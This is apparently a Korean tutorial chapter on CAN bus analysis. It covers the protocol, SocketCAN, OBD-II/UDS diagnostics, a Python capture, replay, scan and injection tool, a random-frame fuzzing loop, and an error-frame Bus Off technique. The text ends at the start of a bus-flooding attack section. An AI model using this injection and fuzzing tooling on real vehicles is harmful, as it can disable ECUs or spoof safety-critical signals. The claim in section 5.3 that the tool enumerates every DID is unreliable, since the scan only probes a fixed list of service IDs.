# 01 CAN Bus Analysis

## 1. CAN 프로토콜 심화

### 1.1 물리 계층

CAN(Controller Area Network)은 ISO 11898-1(데이터 링크·물리 계층)과 ISO 11898-2(고속 물리 계층 최대 1 Mbit/s)로 정의된다. 2-wire 차동 신호 버스(CAN_H, CAN_L)를 사용하며 양 끝단에 120 Ω 종단 저항을 배치한다.

```
CAN_H ──┬──────────────────────────────┬──
        │  120Ω                  120Ω  │
CAN_L ──┴──────────────────────────────┴──

Recessive (논리 1): CAN_H ≈ CAN_L ≈ 2.5 V, 차동 전압 ≈ 0 V
Dominant  (논리 0): CAN_H ≈ 3.5 V, CAN_L ≈ 1.5 V, 차동 전압 ≈ 2 V
```

- **버스 길이 vs. 비트레이트**: 1 Mbit/s → 최대 40 m, 250 kbit/s → 최대 250 m
- **NRZ(Non-Return-to-Zero) 인코딩 + 비트 스터핑**: 동일 비트 5개 연속 시 반대 비트 삽입 → 클럭 동기화 유지

### 1.2 CAN 2.0A/2.0B 프레임 구조

#### Standard Frame (CAN 2.0A, 11-bit ID)

```
[SOF][ID 11bit][RTR][IDE=0][r0][DLC 4bit][DATA 0~8byte][CRC 15bit][CRC Del][ACK][ACK Del][EOF 7bit][IFS 3bit]
```

| 필드 | 비트 | 설명 |
|------|------|------|
| SOF | 1 | Start of Frame, dominant |
| ID | 11 | 메시지 식별자, 우선순위 겸용 |
| RTR | 1 | Remote Transmission Request |
| IDE | 1 | Identifier Extension (0=Standard) |
| DLC | 4 | Data Length Code (0~8) |
| Data | 0~64 | 페이로드 |
| CRC | 15+1 | CRC-15 + delimiter |
| ACK | 2 | ACK slot + delimiter |
| EOF | 7 | End of Frame |

#### Extended Frame (CAN 2.0B, 29-bit ID)

```
[SOF][ID_A 11bit][SRR][IDE=1][ID_B 18bit][RTR][r1][r0][DLC][DATA][CRC][ACK][EOF][IFS]
```

#### CAN FD Frame

DLC가 15 이상이면 64바이트까지 확장(별도 인코딩 테이블). 데이터 페이즈는 별도 비트레이트(최대 8 Mbit/s). BRS(Bit Rate Switch), ESI(Error State Indicator) 필드 추가.

### 1.3 중재(Arbitration)

CAN은 CSMA/CD가 아닌 **CSMA/CA with Non-Destructive Arbitration**을 사용한다. 버스에 동시 전송 시도 시, Dominant 비트가 Recessive를 덮어씀. 송신 노드는 자신이 전송한 비트와 버스 비트를 비교해 다르면 즉시 포기. **낮은 ID = 높은 우선순위**.

```
Node A sends ID: 0x100  (0001 0000 0000)
Node B sends ID: 0x080  (0000 1000 0000)
→ 비트 4에서 A가 Recessive, B가 Dominant → B 승리
```

### 1.4 오류 프레임과 버스 오프

CAN에는 5가지 오류 탐지 메커니즘이 있다:

1. **비트 오류**: 전송 비트 ≠ 모니터 비트
2. **스터핑 오류**: 6개 연속 동일 비트
3. **CRC 오류**: 계산된 CRC ≠ 수신된 CRC
4. **폼 오류**: 고정 형식 필드(EOF 등) 위반
5. **ACK 오류**: ACK 슬롯에서 Dominant 비트 없음

각 노드는 TEC(Transmit Error Counter)와 REC(Receive Error Counter)를 유지:
- TEC/REC < 128: **Error Active** — 오류 프레임(6 dominant bits) 전송
- TEC/REC 128~255: **Error Passive** — 수동 오류 프레임(6 recessive bits)
- TEC > 255: **Bus Off** — 버스에서 분리

**공격 활용**: 오류 프레임을 반복 주입하면 특정 노드를 Bus Off 상태로 만들 수 있다(ECU 강제 오프라인).

### 1.5 OBD-II 커넥터와 핀 배치

OBD-II(On-Board Diagnostics II, SAE J1962) 16핀 D형 커넥터:

```
Pin  2 — SAE J1850 Bus+
Pin  4 — Chassis Ground
Pin  5 — Signal Ground
Pin  6 — CAN High (ISO 15765-4)
Pin  7 — ISO 9141-2 K-Line
Pin 10 — SAE J1850 Bus-
Pin 14 — CAN Low (ISO 15765-4)
Pin 15 — ISO 9141-2 L-Line
Pin 16 — Battery Positive (12 V)
```

OBD-II 포트는 진단 목적으로 대시보드 아래에 노출되어 있어 물리 접근만으로 차량 CAN 버스 직접 접근 가능.

---

## 2. SocketCAN 설정 및 실습

### 2.1 SocketCAN 아키텍처

Linux SocketCAN은 CAN 버스를 네트워크 인터페이스로 추상화한다. `AF_CAN` 소켓 패밀리로 표준 소켓 API 사용 가능.

```
User Space:  candump, cansend, python-can, cantools
─────────────────────────────────────────────────────
Kernel:     AF_CAN socket layer
            CAN raw / CAN BCM / CAN ISO-TP / CAN J1939
            can-dev network driver API
            Peak PCAN / SocketCAN USB 드라이버
─────────────────────────────────────────────────────
Hardware:   CAN controller (SJA1000, MCP2515 등)
```

### 2.2 인터페이스 설정

```bash
# 커널 모듈 확인
lsmod | grep can

# 모듈 로드
sudo modprobe can
sudo modprobe can_raw
sudo modprobe can_bcm
sudo modprobe vcan          # 가상 CAN
sudo modprobe peak_usb      # PCAN-USB

# 가상 인터페이스 (테스트용)
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# 물리 인터페이스 (500 kbit/s)
sudo ip link set can0 type can bitrate 500000 dbitrate 2000000 fd on
sudo ip link set up can0

# 인터페이스 상태 확인
ip -details link show can0

# 오류 카운터 보기
ip -statistics link show can0
```

### 2.3 can-utils 실습

```bash
# 모든 프레임 덤프 (타임스탬프 포함)
candump -t a vcan0

# 특정 ID 필터 (0x7E8 마스크 0xFFF)
candump vcan0 7E8:FFF

# 복수 필터
candump vcan0 7E0:7F0,100:1FF

# 로그 파일로 저장
candump -l vcan0

# 로그 재생
canplayer -I candump-2024-01-01_120000.log vcan0=vcan0

# 단일 프레임 전송 (OBD-II RPM 요청)
cansend vcan0 7DF#0201050000000000

# 인터랙티브 CAN 터미널
cansniffer -c vcan0

# 통계
canstat vcan0
```

### 2.4 ISO-TP (ISO 15765-2) 다중 프레임

OBD-II/UDS는 8바이트 초과 메시지를 ISO-TP로 분할 전송한다.

```bash
# isotp-utils 설치
sudo apt install can-isotp

# ISO-TP 수신 (ID 0x7E8, 요청 ID 0x7DF)
isotprecv -s 7DF -d 7E8 vcan0

# ISO-TP 전송
echo "02 01 0D" | isotpsend -s 7DF -d 7E8 vcan0
```

프레임 유형:
- **SF (Single Frame)**: PCI[0]=0x0N, N=길이, 1프레임에 완성
- **FF (First Frame)**: PCI[0]=0x1N 0xNN, 시작
- **CF (Consecutive Frame)**: PCI[0]=0x2N, 순서번호
- **FC (Flow Control)**: PCI[0]=0x3N, 수신 준비

---

## 3. OBD-II 스캐닝과 UDS 프로토콜

### 3.1 OBD-II PID 쿼리

SAE J1979 표준 PID(Parameter ID):

```
요청:  [길이][서비스 01][PID] 패딩
응답:  [길이][서비스 41][PID][데이터...]

서비스 01 — 현재 데이터:
  PID 0x00 — 지원 PID 비트맵 (01~20)
  PID 0x04 — 엔진 부하 (%)
  PID 0x05 — 냉각수 온도 (°C)
  PID 0x0C — 엔진 RPM (rpm)
  PID 0x0D — 차량 속도 (km/h)
  PID 0x1C — OBD 표준

서비스 03 — 저장된 DTC
서비스 04 — DTC 클리어
서비스 09 — 차량 정보 (VIN 등)
```

실습:
```bash
# RPM 쿼리 (PID 0x0C)
cansend vcan0 7DF#020C0000000000000

# 응답 예시: 7E8 04 41 0C 1A F8 (RPM = (0x1AF8) / 4 = 1726 rpm)

# VIN 쿼리
cansend vcan0 7DF#0209020000000000
```

### 3.2 UDS (Unified Diagnostic Services, ISO 14229)

UDS는 OBD-II보다 강력한 제조사 진단 프로토콜. 표준 요청 ID 0x7DF, 응답 0x7E8(ECU마다 다름).

#### 주요 서비스 ID

```
0x10 — DiagnosticSessionControl
        서브펑션: 01=Default, 02=Programming, 03=Extended
0x11 — ECUReset
        서브펑션: 01=HardReset, 02=KeyOffOnReset, 03=SoftReset
0x14 — ClearDiagnosticInformation
0x19 — ReadDTCInformation
0x22 — ReadDataByIdentifier (DID 2바이트)
0x23 — ReadMemoryByAddress
0x27 — SecurityAccess (시드-키 인증)
0x2E — WriteDataByIdentifier
0x31 — RoutineControl
0x34 — RequestDownload (펌웨어 업로드 시작)
0x36 — TransferData
0x37 — RequestTransferExit
0x3E — TesterPresent (세션 유지)
0x85 — ControlDTCSetting
0x86 — ResponseOnEvent
```

#### 응답 코드

```
긍정 응답: 서비스 ID + 0x40 (예: 0x10 요청 → 0x50 응답)
부정 응답: 0x7F [요청 SID] [NRC]

NRC (Negative Response Code):
0x10 — generalReject
0x11 — serviceNotSupported
0x12 — subFunctionNotSupported
0x13 — incorrectMessageLengthOrInvalidFormat
0x22 — conditionsNotCorrect
0x24 — requestSequenceError
0x25 — noResponseFromSubnetComponent
0x26 — failurePreventsExecutionOfRequestedAction
0x31 — requestOutOfRange
0x33 — securityAccessDenied
0x35 — invalidKey
0x36 — exceededNumberOfAttempts
0x37 — requiredTimeDelayNotExpired
0x70 — uploadDownloadNotAccepted
0x71 — transferDataSuspended
0x72 — generalProgrammingFailure
0x73 — wrongBlockSequenceCounter
0x78 — requestCorrectlyReceivedResponsePending
0x7E — subFunctionNotSupportedInActiveSession
0x7F — serviceNotSupportedInActiveSession
```

### 3.3 UDS 세션 흐름

```
Tester → ECU: 10 02             (Extended Session 요청)
ECU → Tester: 50 02 00 19 01 F4 (OK, P2=25ms, P2*=500ms)

Tester → ECU: 27 01             (SecurityAccess - Seed 요청)
ECU → Tester: 67 01 AA BB CC DD (Seed = 0xAABBCCDD)

Tester → ECU: 27 02 [Key 4byte] (Key 전송)
ECU → Tester: 67 02             (OK) 또는
               7F 27 35          (invalidKey)

Tester → ECU: 22 F1 90          (ReadDataByIdentifier - VIN)
ECU → Tester: 62 F1 90 [17 bytes VIN]
```

---

## 4. Python CAN 분석 도구

아래 도구는 `python-can`을 기반으로 CAN 버스 패킷 캡처, 분석, 재전송 기능을 argparse CLI 인터페이스로 제공한다.

```python
#!/usr/bin/env python3
"""
can_analyzer.py — CAN 버스 캡처·분석·재전송 CLI
사용:
  python can_analyzer.py capture --interface vcan0 --output dump.csv --duration 30
  python can_analyzer.py replay  --interface vcan0 --input dump.csv --rate 1.0
  python can_analyzer.py scan    --interface vcan0 --mode obd2
  python can_analyzer.py inject  --interface vcan0 --id 0x7DF --data "02 01 0C 00 00 00 00 00" --count 5
  python can_analyzer.py analyze --input dump.csv --id-filter 0x7E8
"""

from __future__ import annotations

import argparse
import csv
import logging
import signal
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

import can

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger(__name__)

# ── 데이터 구조 ────────────────────────────────────────────────────────────────

@dataclass
class CanFrame:
    timestamp: float
    arbitration_id: int
    dlc: int
    data: bytes
    is_extended_id: bool = False
    is_fd: bool = False

    def to_csv_row(self) -> list[str]:
        return [
            f"{self.timestamp:.6f}",
            f"0x{self.arbitration_id:03X}",
            str(self.dlc),
            self.data.hex(" ").upper(),
            str(self.is_extended_id),
            str(self.is_fd),
        ]

    @classmethod
    def from_csv_row(cls, row: list[str]) -> "CanFrame":
        return cls(
            timestamp=float(row[0]),
            arbitration_id=int(row[1], 16),
            dlc=int(row[2]),
            data=bytes.fromhex(row[3].replace(" ", "")),
            is_extended_id=row[4] == "True",
            is_fd=row[5] == "True",
        )

    @classmethod
    def from_can_message(cls, msg: can.Message) -> "CanFrame":
        return cls(
            timestamp=msg.timestamp,
            arbitration_id=msg.arbitration_id,
            dlc=msg.dlc,
            data=bytes(msg.data),
            is_extended_id=msg.is_extended_id,
            is_fd=msg.is_fd,
        )


@dataclass
class AnalysisResult:
    total_frames: int = 0
    unique_ids: set[int] = field(default_factory=set)
    id_counts: dict[int, int] = field(default_factory=dict)
    id_last_data: dict[int, bytes] = field(default_factory=dict)
    id_byte_changes: dict[int, list[set[int]]] = field(default_factory=dict)


# ── 버스 인터페이스 팩토리 ────────────────────────────────────────────────────

def create_bus(interface: str, bitrate: int = 500000, fd: bool = False) -> can.Bus:
    """인터페이스 이름에 따라 적절한 can.Bus 객체를 반환한다."""
    if interface.startswith("vcan") or interface.startswith("can"):
        bus = can.Bus(
            channel=interface,
            bustype="socketcan",
            bitrate=bitrate,
            fd=fd,
        )
    elif interface.startswith("PCAN"):
        bus = can.Bus(
            channel=interface,
            bustype="pcan",
            bitrate=bitrate,
        )
    elif interface.startswith("vector"):
        bus = can.Bus(
            channel=interface,
            bustype="vector",
            bitrate=bitrate,
        )
    else:
        # 자동 감지 시도
        bus = can.Bus(channel=interface, bitrate=bitrate)
    return bus


# ── 캡처 ──────────────────────────────────────────────────────────────────────

def cmd_capture(args: argparse.Namespace) -> int:
    """CAN 버스 패킷을 캡처하여 CSV로 저장한다."""
    output_path = Path(args.output)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    id_filter: Optional[int] = None
    if args.id_filter:
        id_filter = int(args.id_filter, 16)

    captured: list[CanFrame] = []
    stop_event = False

    def _signal_handler(sig: int, frame: object) -> None:
        nonlocal stop_event
        stop_event = True
        logger.info("캡처 중단 요청")

    signal.signal(signal.SIGINT, _signal_handler)

    logger.info(f"캡처 시작: {args.interface} → {output_path}")
    start_time = time.monotonic()

    try:
        bus = create_bus(args.interface, args.bitrate)
    except can.CanError as e:
        logger.error(f"버스 연결 실패: {e}")
        return 1

    try:
        while not stop_event:
            elapsed = time.monotonic() - start_time
            if args.duration and elapsed >= args.duration:
                logger.info(f"캡처 완료 ({args.duration}s)")
                break

            msg = bus.recv(timeout=0.5)
            if msg is None:
                continue

            if id_filter is not None and msg.arbitration_id != id_filter:
                continue

            frame = CanFrame.from_can_message(msg)
            captured.append(frame)

            if args.verbose:
                logger.info(
                    f"[{frame.timestamp:.4f}] "
                    f"ID=0x{frame.arbitration_id:03X} "
                    f"DLC={frame.dlc} "
                    f"DATA={frame.data.hex(' ').upper()}"
                )

            if args.max_frames and len(captured) >= args.max_frames:
                logger.info(f"최대 프레임 수 도달: {args.max_frames}")
                break
    finally:
        bus.shutdown()

    # CSV 저장
    with output_path.open("w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "id", "dlc", "data", "extended", "fd"])
        for fr in captured:
            writer.writerow(fr.to_csv_row())

    logger.info(f"저장 완료: {len(captured)} 프레임 → {output_path}")
    return 0


# ── 재전송 ────────────────────────────────────────────────────────────────────

def cmd_replay(args: argparse.Namespace) -> int:
    """캡처된 CSV 파일을 재전송한다."""
    input_path = Path(args.input)
    if not input_path.exists():
        logger.error(f"파일 없음: {input_path}")
        return 1

    frames: list[CanFrame] = []
    with input_path.open() as f:
        reader = csv.reader(f)
        next(reader)  # 헤더 스킵
        for row in reader:
            try:
                frames.append(CanFrame.from_csv_row(row))
            except (ValueError, IndexError) as e:
                logger.warning(f"파싱 오류: {row} — {e}")

    if not frames:
        logger.error("재전송할 프레임 없음")
        return 1

    logger.info(f"재전송 준비: {len(frames)} 프레임 (속도 배율 {args.rate}x)")

    try:
        bus = create_bus(args.interface, args.bitrate)
    except can.CanError as e:
        logger.error(f"버스 연결 실패: {e}")
        return 1

    try:
        base_ts = frames[0].timestamp
        replay_start = time.monotonic()

        for i, fr in enumerate(frames):
            target_offset = (fr.timestamp - base_ts) / args.rate
            current_offset = time.monotonic() - replay_start

            delay = target_offset - current_offset
            if delay > 0:
                time.sleep(delay)

            msg = can.Message(
                arbitration_id=fr.arbitration_id,
                data=fr.data,
                is_extended_id=fr.is_extended_id,
                is_fd=fr.is_fd,
            )
            try:
                bus.send(msg)
                if args.verbose:
                    logger.info(
                        f"[{i+1}/{len(frames)}] "
                        f"ID=0x{fr.arbitration_id:03X} "
                        f"DATA={fr.data.hex(' ').upper()}"
                    )
            except can.CanError as e:
                logger.error(f"전송 오류: {e}")
    finally:
        bus.shutdown()

    logger.info("재전송 완료")
    return 0


# ── OBD-II / UDS 스캔 ─────────────────────────────────────────────────────────

OBD2_PIDS: dict[int, str] = {
    0x00: "지원 PID 목록 (01-20)",
    0x04: "엔진 부하",
    0x05: "냉각수 온도",
    0x0A: "연료 압력",
    0x0B: "흡기 매니폴드 절대 압력",
    0x0C: "엔진 RPM",
    0x0D: "차량 속도",
    0x0E: "점화 타이밍 진각",
    0x0F: "흡기 온도",
    0x10: "MAF 공기 유량",
    0x11: "스로틀 위치",
    0x1C: "OBD 표준",
    0x1F: "시동 후 주행 시간",
    0x21: "MIL 후 주행 거리",
    0x2F: "연료 탱크 레벨",
    0x33: "대기압",
    0x4D: "MIL 점등 후 주행 시간",
    0x5C: "엔진 오일 온도",
}

UDS_SERVICES: list[int] = [
    0x10, 0x11, 0x14, 0x19, 0x22, 0x23, 0x24,
    0x27, 0x28, 0x2A, 0x2C, 0x2E, 0x2F, 0x31,
    0x34, 0x35, 0x36, 0x37, 0x38, 0x3D, 0x3E,
    0x83, 0x84, 0x85, 0x86, 0x87,
]


def _send_and_receive(
    bus: can.Bus,
    req_id: int,
    data: bytes,
    resp_id: int,
    timeout: float = 0.5,
) -> Optional[bytes]:
    """단일 CAN 요청 전송 후 응답 대기. None이면 타임아웃."""
    msg = can.Message(arbitration_id=req_id, data=data, is_extended_id=False)
    try:
        bus.send(msg)
    except can.CanError as e:
        logger.debug(f"전송 오류: {e}")
        return None

    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        resp = bus.recv(timeout=0.1)
        if resp and resp.arbitration_id == resp_id:
            return bytes(resp.data)
    return None


def _decode_obd2_response(pid: int, data: bytes) -> str:
    """OBD-II 응답 디코딩 (주요 PID)."""
    if len(data) < 4:
        return "데이터 부족"
    d = data[3:]
    if pid == 0x0C and len(d) >= 2:
        rpm = ((d[0] << 8) | d[1]) / 4
        return f"{rpm:.0f} rpm"
    elif pid == 0x0D and len(d) >= 1:
        return f"{d[0]} km/h"
    elif pid == 0x05 and len(d) >= 1:
        return f"{d[0] - 40} °C"
    elif pid == 0x04 and len(d) >= 1:
        return f"{d[0] * 100 / 255:.1f} %"
    elif pid == 0x11 and len(d) >= 1:
        return f"{d[0] * 100 / 255:.1f} %"
    return data.hex(" ").upper()


def cmd_scan(args: argparse.Namespace) -> int:
    """OBD-II PID 또는 UDS 서비스 ID 스캔."""
    try:
        bus = create_bus(args.interface, args.bitrate)
    except can.CanError as e:
        logger.error(f"버스 연결 실패: {e}")
        return 1

    req_id = int(args.req_id, 16) if args.req_id else 0x7DF
    resp_id = int(args.resp_id, 16) if args.resp_id else 0x7E8

    results: list[tuple[str, str, str]] = []

    def scan_obd2() -> None:
        logger.info(f"OBD-II PID 스캔: req=0x{req_id:03X} resp=0x{resp_id:03X}")
        for pid, name in OBD2_PIDS.items():
            req_data = bytes([0x02, 0x01, pid, 0x00, 0x00, 0x00, 0x00, 0x00])
            resp = _send_and_receive(bus, req_id, req_data, resp_id, timeout=args.timeout)
            if resp and len(resp) >= 3 and resp[1] == 0x41 and resp[2] == pid:
                decoded = _decode_obd2_response(pid, resp)
                results.append((f"PID 0x{pid:02X}", name, decoded))
                logger.info(f"  PID 0x{pid:02X} ({name}): {decoded}")
            else:
                logger.debug(f"  PID 0x{pid:02X} ({name}): 응답 없음")
            time.sleep(0.05)

    def scan_uds() -> None:
        logger.info(f"UDS 서비스 스캔: req=0x{req_id:03X} resp=0x{resp_id:03X}")

        def probe_service(svc: int) -> tuple[int, Optional[bytes]]:
            req_data = bytes([0x02, svc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
            resp = _send_and_receive(bus, req_id, req_data, resp_id, timeout=args.timeout)
            return svc, resp

        with ThreadPoolExecutor(max_workers=args.workers) as executor:
            futures = {executor.submit(probe_service, svc): svc for svc in UDS_SERVICES}
            for future in as_completed(futures):
                svc, resp = future.result()
                if resp is None:
                    logger.debug(f"  SID 0x{svc:02X}: 타임아웃")
                    continue

                if resp[0] == 0x7F and resp[1] == svc:
                    nrc = resp[2] if len(resp) > 2 else 0
                    # 0x11(serviceNotSupported) 제외하고 나머지는 존재하는 서비스
                    if nrc != 0x11:
                        results.append((
                            f"SID 0x{svc:02X}", "지원됨 (NRC)",
                            f"NRC=0x{nrc:02X}"
                        ))
                        logger.info(f"  SID 0x{svc:02X}: 지원됨 (NRC=0x{nrc:02X})")
                elif resp[0] == svc + 0x40:
                    results.append((f"SID 0x{svc:02X}", "긍정 응답", resp.hex(" ").upper()))
                    logger.info(f"  SID 0x{svc:02X}: 긍정 응답 → {resp.hex(' ').upper()}")

    try:
        if args.mode == "obd2":
            scan_obd2()
        elif args.mode == "uds":
            scan_uds()
        else:
            scan_obd2()
            scan_uds()
    finally:
        bus.shutdown()

    if args.output:
        out_path = Path(args.output)
        with out_path.open("w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["identifier", "description", "value"])
            writer.writerows(results)
        logger.info(f"결과 저장: {out_path}")

    logger.info(f"스캔 완료: {len(results)}개 항목 발견")
    return 0


# ── 패킷 주입 ─────────────────────────────────────────────────────────────────

def cmd_inject(args: argparse.Namespace) -> int:
    """단일 CAN 프레임을 반복 전송한다."""
    arb_id = int(args.id, 16)
    raw_data = bytes.fromhex(args.data.replace(" ", "").replace(":", ""))

    if len(raw_data) > 8:
        logger.error("표준 CAN 프레임은 최대 8바이트")
        return 1

    try:
        bus = create_bus(args.interface, args.bitrate)
    except can.CanError as e:
        logger.error(f"버스 연결 실패: {e}")
        return 1

    msg = can.Message(
        arbitration_id=arb_id,
        data=raw_data,
        is_extended_id=args.extended,
    )

    logger.info(
        f"주입: ID=0x{arb_id:03X} DATA={raw_data.hex(' ').upper()} "
        f"× {args.count} (간격 {args.interval}s)"
    )

    sent = 0
    try:
        for i in range(args.count):
            try:
                bus.send(msg)
                sent += 1
                if args.verbose:
                    logger.info(f"  [{i+1}/{args.count}] 전송 완료")
            except can.CanError as e:
                logger.error(f"전송 오류 [{i+1}]: {e}")

            if i < args.count - 1:
                time.sleep(args.interval)
    finally:
        bus.shutdown()

    logger.info(f"주입 완료: {sent}/{args.count} 성공")
    return 0


# ── 분석 ──────────────────────────────────────────────────────────────────────

def cmd_analyze(args: argparse.Namespace) -> int:
    """캡처된 CSV 파일을 분석하여 통계 및 변화 패턴을 출력한다."""
    input_path = Path(args.input)
    if not input_path.exists():
        logger.error(f"파일 없음: {input_path}")
        return 1

    id_filter: Optional[int] = None
    if args.id_filter:
        id_filter = int(args.id_filter, 16)

    frames: list[CanFrame] = []
    with input_path.open() as f:
        reader = csv.reader(f)
        next(reader)
        for row in reader:
            try:
                fr = CanFrame.from_csv_row(row)
                if id_filter is not None and fr.arbitration_id != id_filter:
                    continue
                frames.append(fr)
            except (ValueError, IndexError) as e:
                logger.warning(f"파싱 오류: {e}")

    if not frames:
        logger.error("분석할 프레임 없음")
        return 1

    result = AnalysisResult()
    result.total_frames = len(frames)

    # 멀티스레드 분석: ID별 그룹화 후 병렬 처리
    from collections import defaultdict
    id_groups: dict[int, list[CanFrame]] = defaultdict(list)
    for fr in frames:
        id_groups[fr.arbitration_id].append(fr)

    def analyze_group(arb_id: int, group: list[CanFrame]) -> dict:
        """단일 ID 그룹의 통계를 계산한다."""
        byte_changes: list[set[int]] = [set() for _ in range(8)]
        prev_data: Optional[bytes] = None
        for fr in group:
            for i, b in enumerate(fr.data):
                byte_changes[i].add(b)
            prev_data = fr.data
        intervals = []
        for i in range(1, len(group)):
            intervals.append(group[i].timestamp - group[i-1].timestamp)
        avg_interval = sum(intervals) / len(intervals) if intervals else 0.0
        return {
            "id": arb_id,
            "count": len(group),
            "last_data": group[-1].data if group else b"",
            "byte_unique_vals": byte_changes,
            "avg_interval_ms": avg_interval * 1000,
            "dlc": group[-1].dlc if group else 0,
        }

    stats: list[dict] = []
    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        futures = {
            executor.submit(analyze_group, arb_id, group): arb_id
            for arb_id, group in id_groups.items()
        }
        for future in as_completed(futures):
            stats.append(future.result())

    stats.sort(key=lambda x: x["count"], reverse=True)

    print(f"\n{'='*70}")
    print(f"CAN 분석 결과: {input_path.name}")
    print(f"총 프레임: {result.total_frames:,}  고유 ID: {len(id_groups):,}")
    if frames:
        duration = frames[-1].timestamp - frames[0].timestamp
        print(f"캡처 시간: {duration:.2f}s  평균 프레임율: {result.total_frames/max(duration,0.001):.1f} fps")
    print(f"{'='*70}")
    print(f"{'ID':>6}  {'DLC':>4}  {'Count':>8}  {'Avg ms':>8}  {'ByteEntropy':>12}  {'LastData'}")
    print(f"{'-'*70}")

    for s in stats[:args.top]:
        # 바이트별 고유값 수로 엔트로피 추정
        entropy_str = " ".join(f"{len(v):2d}" for v in s["byte_unique_vals"][:s["dlc"]])
        last_data_str = s["last_data"].hex(" ").upper()
        print(
            f"0x{s['id']:04X}  {s['dlc']:4d}  {s['count']:8,}  "
            f"{s['avg_interval_ms']:8.1f}  {entropy_str:>12}  {last_data_str}"
        )

    # 동적 신호 후보 (바이트 고유값 >= 3)
    print(f"\n동적 신호 후보 (바이트 고유값 >= 3):")
    for s in stats:
        for i, vals in enumerate(s["byte_unique_vals"][:s["dlc"]]):
            if len(vals) >= 3:
                print(
                    f"  ID=0x{s['id']:04X} Byte[{i}]: "
                    f"{len(vals)}개 고유값 "
                    f"min={min(vals):3d} max={max(vals):3d}"
                )

    if args.output:
        out_path = Path(args.output)
        with out_path.open("w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["id", "dlc", "count", "avg_interval_ms", "last_data"])
            for s in stats:
                writer.writerow([
                    f"0x{s['id']:04X}",
                    s["dlc"],
                    s["count"],
                    f"{s['avg_interval_ms']:.2f}",
                    s["last_data"].hex(" ").upper(),
                ])
        logger.info(f"분석 결과 저장: {out_path}")

    return 0


# ── CLI 파서 ──────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="can_analyzer",
        description="CAN 버스 캡처·분석·재전송 도구",
    )
    parser.add_argument(
        "--bitrate", type=int, default=500000,
        help="CAN 비트레이트 (기본값: 500000)",
    )
    parser.add_argument(
        "--workers", type=int, default=4,
        help="ThreadPoolExecutor 워커 수 (기본값: 4)",
    )

    sub = parser.add_subparsers(dest="command", required=True)

    # capture
    p_cap = sub.add_parser("capture", help="CAN 프레임 캡처")
    p_cap.add_argument("--interface", required=True, help="CAN 인터페이스 (vcan0, can0 등)")
    p_cap.add_argument("--output", required=True, help="출력 CSV 경로")
    p_cap.add_argument("--duration", type=float, help="캡처 시간(초)")
    p_cap.add_argument("--max-frames", type=int, help="최대 프레임 수")
    p_cap.add_argument("--id-filter", help="필터링할 CAN ID (hex)")
    p_cap.add_argument("--verbose", action="store_true")
    p_cap.set_defaults(func=cmd_capture)

    # replay
    p_rep = sub.add_parser("replay", help="CSV 프레임 재전송")
    p_rep.add_argument("--interface", required=True)
    p_rep.add_argument("--input", required=True, help="입력 CSV 경로")
    p_rep.add_argument("--rate", type=float, default=1.0, help="재생 속도 배율")
    p_rep.add_argument("--verbose", action="store_true")
    p_rep.set_defaults(func=cmd_replay)

    # scan
    p_scan = sub.add_parser("scan", help="OBD-II/UDS 스캔")
    p_scan.add_argument("--interface", required=True)
    p_scan.add_argument("--mode", choices=["obd2", "uds", "all"], default="all")
    p_scan.add_argument("--req-id", help="요청 CAN ID (기본 0x7DF)")
    p_scan.add_argument("--resp-id", help="응답 CAN ID (기본 0x7E8)")
    p_scan.add_argument("--timeout", type=float, default=0.5)
    p_scan.add_argument("--output", help="결과 CSV 경로")
    p_scan.set_defaults(func=cmd_scan)

    # inject
    p_inj = sub.add_parser("inject", help="CAN 프레임 주입")
    p_inj.add_argument("--interface", required=True)
    p_inj.add_argument("--id", required=True, help="CAN ID (hex)")
    p_inj.add_argument("--data", required=True, help="데이터 바이트 (hex, 공백 구분)")
    p_inj.add_argument("--count", type=int, default=1, help="전송 횟수")
    p_inj.add_argument("--interval", type=float, default=0.01, help="전송 간격(초)")
    p_inj.add_argument("--extended", action="store_true", help="Extended ID 사용")
    p_inj.add_argument("--verbose", action="store_true")
    p_inj.set_defaults(func=cmd_inject)

    # analyze
    p_ana = sub.add_parser("analyze", help="캡처 파일 분석")
    p_ana.add_argument("--input", required=True)
    p_ana.add_argument("--id-filter", help="분석할 CAN ID (hex)")
    p_ana.add_argument("--top", type=int, default=20, help="상위 N개 ID 표시")
    p_ana.add_argument("--output", help="분석 결과 CSV 경로")
    p_ana.set_defaults(func=cmd_analyze)

    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
```

---

## 5. 실전 CAN 버스 리버싱 워크플로우

### 5.1 알 수 없는 신호 역분석

1. `candump -l vcan0`으로 차량 정상 상태 10분 캡처
2. `can_analyzer.py analyze`로 ID별 엔트로피 분석
3. 엔트로피 높은 ID를 대상으로 운전자가 특정 동작(창문 올림, 방향지시등) 수행하며 변화하는 바이트 추적
4. 변화 패턴과 타이밍을 DBC 파일로 정의
5. `cansend`로 해당 신호를 임의 값으로 재전송하여 실제 제어 여부 확인

### 5.2 퍼징 패턴

```bash
# 특정 ID에 랜덤 데이터 반복 주입 (퍼징)
for i in $(seq 1 1000); do
    DATA=$(python3 -c "import random; print(' '.join(f'{random.randint(0,255):02X}' for _ in range(8)))")
    cansend vcan0 "$(printf '%03X' $((RANDOM % 2048)))#${DATA// /}"
    sleep 0.001
done
```

### 5.3 UDS DID 브루트포스

```bash
# 0x0000~0xFFFF DID 전체 열거
python3 can_analyzer.py scan --interface vcan0 --mode uds \
    --req-id 0x7DF --resp-id 0x7E8 --output uds_scan.csv
```

모든 DID에 대해 `22 [DID_HIGH] [DID_LOW]` 요청을 전송하여 긍정 응답 또는 조건부 거부(0x7F ... 0x22) 반환 ID를 수집한다.

---

## 6. CAN 버스 공격 시나리오

### 6.1 DoS (Bus Flooding)

버스를 최대 속도로 패킷으로 채워 정상 ECU 통신을 방해한다.

```python
